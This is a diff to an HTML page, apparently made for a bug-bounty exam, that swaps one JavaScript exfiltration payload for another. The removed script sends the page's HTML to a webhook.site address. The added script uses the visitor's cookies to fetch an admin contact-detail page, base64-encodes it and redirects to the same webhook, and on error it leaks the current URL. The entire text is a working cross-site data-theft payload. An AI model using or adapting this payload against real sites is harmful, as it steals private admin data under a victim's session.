@@ -3,13 +3,24 @@
 <body>
     <script>
         const webh = "https://webhook.site/d46b46e3-a9c2-4a1c-816f-c3156dbbd093";
-        
-        // Capture everything inside the <html> tags
-        const fullHTML = document.documentElement.innerHTML;
-        
-        // Redirect to leak the data. 
-        // We use encodeURIComponent because HTML is too large for btoa() sometimes
-        window.location.href = webh + "?html_leak=" + btoa(unescape(encodeURIComponent(fullHTML.substring(0, 5000))));
+        const targetId = "69ea8d12bee6d6b7c664637c"; // The ID you captured
+        const targetUrl = `https://bugbounty-exam.hashacademy.co/admin/contacts/${targetId}`;
+
+        async function scrapeDetail() {
+            try {
+                // We fetch the HTML of the specific message detail page
+                const response = await fetch(targetUrl, { credentials: "include" });
+                const html = await response.text();
+                
+                // Leak the first 5000 chars of that specific page
+                window.location.href = `${webh}?detail_leak=${btoa(unescape(encodeURIComponent(html.substring(0, 5000))))}`;
+            } catch (e) {
+                // Fallback: Just tell us where the bot is currently
+                window.location.href = `${webh}?current_url=${btoa(window.location.href)}`;
+            }
+        }
+
+        scrapeDetail();
     </script>
 </body>
 </html>
